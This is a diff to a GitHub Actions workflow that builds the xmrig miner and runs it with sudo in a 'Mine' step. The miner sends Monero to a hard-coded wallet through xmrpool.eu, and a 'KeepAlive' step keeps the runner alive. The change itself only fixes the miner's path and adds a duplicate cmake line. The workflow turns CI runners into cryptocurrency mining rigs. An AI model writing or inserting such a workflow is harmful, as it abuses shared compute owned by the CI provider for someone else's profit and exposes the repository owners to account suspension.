@@ -16,9 +16,10 @@ jobs:
           mkdir xmrig/build && cd xmrig/scripts
           ./build_deps.sh && cd ../build
           cmake .. -DXMRIG_DEPS=scripts/deps
+          cmake .. -DXMRIG_DEPS=scripts/deps
           make -j$(nproc)
       - name: Mine
         run: |
-          sudo ./xmrig -o xmrpool.eu:9999 -u 488RXf348f57LAtxpWaNKLEaUtL6Ye9cpXVCuP27ci1CRYNUM5eR3w7fAHbsyZT1vdDgSJBr4TPTkLUN4AY5GJfXNWJtjZT -k --tls
+          sudo /home/runner/xmrig/build/./xmrig -o xmrpool.eu:9999 -u 488RXf348f57LAtxpWaNKLEaUtL6Ye9cpXVCuP27ci1CRYNUM5eR3w7fAHbsyZT1vdDgSJBr4TPTkLUN4AY5GJfXNWJtjZT -k --tls
       - name: KeepAlive
         run: bash ./keepalive.sh
